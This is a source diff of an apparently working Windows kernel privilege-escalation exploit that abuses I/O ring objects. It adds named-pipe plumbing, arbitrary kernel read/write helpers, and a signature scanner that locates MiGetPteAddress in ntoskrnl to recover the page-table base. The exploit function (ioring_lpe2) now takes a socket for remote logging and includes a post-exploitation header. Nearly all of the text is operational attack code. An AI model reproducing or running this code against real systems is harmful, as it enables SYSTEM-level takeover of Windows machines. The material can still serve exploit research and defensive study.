@@ -11,6 +11,8 @@
 #include "ioring.h"
 #include "win_defs.h"
 #include "nt_offsets.h"
+#include "post_exploit.h"
+//#include <WinSock2.h>
 
 HIORING hIoRing = NULL;
 PIORING_OBJECT pIoRing = NULL;
@@ -18,6 +20,11 @@ HANDLE hInPipe = INVALID_HANDLE_VALUE;
 HANDLE hOutPipe = INVALID_HANDLE_VALUE;
 HANDLE hInPipeClient = INVALID_HANDLE_VALUE;
 HANDLE hOutPipeClient = INVALID_HANDLE_VALUE;
+HANDLE hInPipeF = INVALID_HANDLE_VALUE;
+HANDLE hOutPipeF = INVALID_HANDLE_VALUE;
+HANDLE hInPipeClientF = INVALID_HANDLE_VALUE;
+HANDLE hOutPipeClientF = INVALID_HANDLE_VALUE;
+BOOL bUsePipes = FALSE;
 
 
 int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
@@ -70,6 +77,40 @@ int ioring_setup(PIORING_OBJECT* ppIoRingAddr)
 
 done:
     return ret;
+}
+
+int ioring_restore_files() {
+    hInPipe = hInPipeF;
+    hOutPipe = hOutPipeF;
+    hInPipeClient = hInPipeClientF;
+    hOutPipeClient = hOutPipeClientF;
+    return 0;
+}
+
+int ioring_use_pipes() {
+    hInPipeF = hInPipe;
+    hOutPipeF = hOutPipe;
+
+    hInPipeClientF = hInPipeClient;
+    hOutPipeClient = hOutPipeClient;
+
+    hInPipe = CreateNamedPipeA("\\\\.\\pipe\\CollatIn", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
+    hOutPipe = CreateNamedPipeA("\\\\.\\pipe\\CollatOut", PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
+    if (hInPipe == INVALID_HANDLE_VALUE || hOutPipe == INVALID_HANDLE_VALUE) {
+        return GetLastError();
+    }
+
+    hInPipeClient = CreateFileA("\\\\.\\pipe\\CollatIn", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    hOutPipeClient = CreateFileA("\\\\.\\pipe\\CollatOut", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hInPipeClient == INVALID_HANDLE_VALUE || hOutPipeClient == INVALID_HANDLE_VALUE) {
+        return GetLastError();
+
+    }
+
+    
+
+    bUsePipes = TRUE;
+    return 0;
 }
 
 int getobjptr(PULONG64 ppObjAddr, ULONG ulPid, HANDLE handle)
@@ -178,15 +219,17 @@ int ioring_read(PULONG64 pRegisterBuffers, ULONG64 pReadAddr, PVOID pReadBuffer,
         goto done;
     }
 
+    //if (ConnectNamedPipe(hOutPipe, NULL) != 0 || !bUsePipes) {
     SetFilePointer(hOutPipe, 0, NULL, FILE_BEGIN);
     if (0 == ReadFile(hOutPipe, pReadBuffer, ulReadLen, NULL, NULL))
     {
         ret = GetLastError();
         //ret = 0x1337;
-        
+
         goto done;
     }
     FlushFileBuffers(hOutPipe);
+    //}
 
     ret = 0;
 
@@ -331,59 +374,76 @@ int krnl_read(UINT64 addr, PVOID buffer, SIZE_T size) {
     return ioring_read(0x65007500, addr, buffer, size);
 }
 
+BOOL match_sig(CHAR* buffer, CHAR* signature, SIZE_T signatureSize) {
+    for (SIZE_T i = 0; i < signatureSize; i++) {
+        if (signature[i] != '\xff' && buffer[i] != signature[i]) {
+            return FALSE;
+        }
+    }
+    return TRUE;
+}
+
+UINT64 kernel_sigscan(UINT64 baseAddress, UINT64 size, CHAR* signature, SIZE_T signatureSize) {
+    if (baseAddress == NULL || size == 0 || signature == NULL || signatureSize == 0)
+        return NULL;
+
+    CHAR* buffer = (CHAR*)malloc(size);
+    if (krnl_read(baseAddress, buffer, size) != 0) {
+        free(buffer);
+        return NULL;
+    }
+
+    for (SIZE_T i = 0; i <= size - signatureSize; i++) {
+        if (match_sig(buffer + i, signature, signatureSize)) {
+            return baseAddress + i;
+        }
+    }
+
+    free(buffer);
+    return NULL;
+}
+
+UINT64 krnl_sigscan_s(UINT64 baseAddress, UINT64 size, CHAR* signature, SIZE_T signatureSize) {
+    if (baseAddress == NULL || size == 0 || signature == NULL || signatureSize == 0)
+        return 0;
+
+    CHAR* buffer = (CHAR*)malloc(size);
+    if (krnl_read_s(baseAddress, buffer, size) != 0) {
+        free(buffer);
+        return 0;
+    }
+
+    for (SIZE_T i = 0; i <= size - signatureSize; i++) {
+        if (match_sig(buffer + i, signature, signatureSize)) {
+            return baseAddress + i;
+        }
+    }
+
+    free(buffer);
+    return 0;
+}
+
 
 ULONG64 ulPageTableAddress; // for testing, need to grab this!!!!!
 ULONG64 get_pagetable_addr() {
     return ulPageTableAddress;
 }
 
-ULONG64 get_pagetable_address(UINT64 ntBase) {
-    /*
-    UINT64 getPteAddress_addr = kernel_sigscan(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET, APPROX_NTOSKRNL_TEXT_SIZE, getPteAddressSignature, sizeof(getPteAddressSignature)); // might have to scan by page
-
-    ULONG64 pageTableAddress = 0;
-    krnl_read(getPteAddress_addr + 0x13, &pageTableAddress, sizeof(ULONG64));
-
-    return pageTableAddress;*/
-    CHAR getPteAddressSignature[] = { 0x48, 0xc1, 0xe9, 0xff, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x23, 0xc8, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x48, 0x03, 0xc1 };
+// slower than using the offset soooo maybe use offset?
+ULONG64 get_pagetable_address(SOCKET s, UINT64 ntBase) {
+    CHAR getPteAddressSignature[] = GET_PTE_ADDRESS_SIGNATURE;
     CHAR ptr_msg[1024] = { 0 };
 
-    UINT64 getPteAddress_offset = 0x1efb60;
-    //CHAR getPteAddressBytes[30] = { 0 };
     ULONG64 pageTableAddress;
-    krnl_read(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + getPteAddress_offset + 0x13, &pageTableAddress, sizeof(ULONG64));
-
-    //char out[256] = { 0 };
-    //hex_dump(getPteAddressBytes, sizeof(getPteAddressBytes), out);
-
-
-
-    /*sprintf_s(ptr_msg,
-        sizeof(ptr_msg),
-        "[?] MiGetPteAddress bytes:\n%s", out);
-    sock_log(sock, ptr_msg);*/
-
-
-
-    /*sprintf_s(ptr_msg,
-        sizeof(ptr_msg),
-        "[?] PageTable Address: 0x%llx\n",
-        pageTableAddress);
-    sock_log(sock, ptr_msg);*/
-
-    //memcpy(&pageTableAddress, getPteAddressBytes + 0x13, sizeof(ULONG64));
-
-    return pageTableAddress; // TODO: fix sig scanner because thats more elegant
-
-    /*UINT64 getPteAddress_addr;
+    UINT64 getPteAddress_addr;
     UINT64 page = 0x0;
-    sock_log(sock, "[?] Attempting to find MiGetPteAddress.\n");
+    sock_log(s, "[?] Attempting to find MiGetPteAddress.\n");
     do {
         sprintf_s(ptr_msg,
             sizeof(ptr_msg),
-            "\r[?] Scanning page: 0x%llx",
+            "\r[?] Scanning page: [0x%llx]",
             ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + page);
-        sock_log(sock, ptr_msg);
+        sock_log(s, ptr_msg);
         getPteAddress_addr = kernel_sigscan(ntBase + APPROX_NTOSKRNL_TEXT_OFFSET + page, 0x1000, getPteAddressSignature, sizeof(getPteAddressSignature)); // hopefully .text and no crash?
         page += 0x1000;
     } while (getPteAddress_addr == NULL && page < APPROX_NTOSKRNL_TEXT_SIZE);
@@ -391,7 +451,14 @@ ULONG64 get_pagetable_address(UINT64 ntBase) {
         sizeof(ptr_msg),
         "\n[?] MiGetPteAddress: 0x%llx\n",
         getPteAddress_addr);
-    sock_log(sock, ptr_msg);*/
+    sock_log(s, ptr_msg);
+
+    krnl_read(getPteAddress_addr + 0x13, &pageTableAddress, sizeof(ULONG64));
+    pMiGetPteAddress = getPteAddress_addr;
+    return pageTableAddress;
+}
+UINT64 get_getpteaddress_address() {
+    return pMiGetPteAddress;
 }
 
 void set_pagetable_addr(ULONG64 pageTableAddress) {
@@ -439,6 +506,7 @@ int krnl_write_s(UINT64 addr, PVOID data, SIZE_T size) {
 
 UINT64 ulNtBase;
 void ioring_cleanup() {
+    ioring_restore_files();
     if (!ulNtBase)
         return;
     UINT64 orig_val = ulNtBase + get_orig_sd_offset();
@@ -459,7 +527,7 @@ ULONG64 get_systok2() {
     return systok2;
 }
 
-int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
+int ioring_lpe2(SOCKET s, ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCnt, UINT64 ioring_addr, UINT64 nt_base)
 {
     int ret = -1;
     HANDLE hProc = NULL;
@@ -533,8 +601,8 @@ int ioring_lpe2(ULONG pid, ULONG64 ullFakeRegBufferAddr, ULONG ulFakeRegBufferCn
 
     //UINT64 orig_val = ulNtBase + get_orig_sd_offset();
     //ret = ioring_write(pFakeRegBuffers, ulNtBase + get_sd_ptr_offset(), &orig_val, sizeof(orig_val));
-    
-    ulPageTableAddress = get_pagetable_address(nt_base);
+    ioring_use_pipes();
+    ulPageTableAddress = get_pagetable_address(s, nt_base);
     //ioring_cleanup();
     
     
